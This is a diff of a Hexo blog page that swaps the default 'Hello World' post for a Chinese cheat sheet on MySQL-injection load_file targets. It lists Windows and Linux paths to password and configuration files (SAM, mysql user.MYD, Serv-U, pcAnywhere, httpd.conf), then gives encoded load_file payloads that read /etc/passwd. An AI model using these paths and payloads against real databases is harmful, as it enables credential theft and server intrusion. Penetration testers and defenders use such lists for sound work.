@@ -2,7 +2,7 @@
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-<title>Hello World</title>
+<title>mysql注入常见load_file路径</title>
 <meta name="author" content="John Doe">
 <!--[if IE]>
   <meta http-equiv=refresh content='0, http://browsehappy.com'>
@@ -50,9 +50,9 @@
     <section class="main">
       <div class="post">
   <div class="post-header">
-    <h1 class="title">Hello World</h1>
+    <h1 class="title">mysql注入常见load_file路径</h1>
     <div class="post-info">
-      <span class="date">2019-02-05</span>
+      <span class="date">2019-01-31</span>
 
       
     </div>
@@ -62,17 +62,53 @@
     <!-- Gallery -->
     
 
-    <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+    <p>WINDOWS下:<br>c:/boot.ini //查看系统版本</p>
+<p>c:/windows/php.ini //php配置信息</p>
+<p>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</p>
+<p>c:/winnt/php.ini</p>
+<p>c:/winnt/my.ini</p>
+<p>c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</p>
+<p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</p>
+<p>c:\Program Files\Serv-U\ServUDaemon.ini</p>
+<p>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</p>
+<p>c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</p>
+<p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</p>
+<p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p>
+<p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件</p>
+<p>//存储了pcAnywhere的登陆密码</p>
+<p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</p>
+<p>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</p>
+<p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</p>
+<p>d:\APACHE\Apache2\conf\httpd.conf</p>
+<p>C:\Program Files\mysql\my.ini</p>
+<p>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</p>
+<p>LUNIX/UNIX 下:<br>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</p>
+<p>/usr/local/apache2/conf/httpd.conf</p>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p>
+<p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p>
+<p>/etc/sysconfig/iptables //从中得到防火墙规则策略</p>
+<p>/etc/httpd/conf/httpd.conf // apache配置文件</p>
+<p>/etc/rsyncd.conf //同步程序配置文件</p>
+<p>/etc/my.cnf //mysql的配置文件</p>
+<p>/etc/redhat-release //系统版本</p>
+<p>/etc/issue</p>
+<p>/etc/issue.net</p>
+<p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p>
+<p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p>
+<p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
+<p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p>
+<p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</p>
+<p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
+<p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p>
+<p>/etc/sysconfig/iptables 查看防火墙策略</p>
+<p>load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</p>
+<p>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</p>
+<p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
 
-    <span class="date end-date">2019-02-05</span>
+    <span class="date end-date">2019-01-31</span>
   </div>
 
   
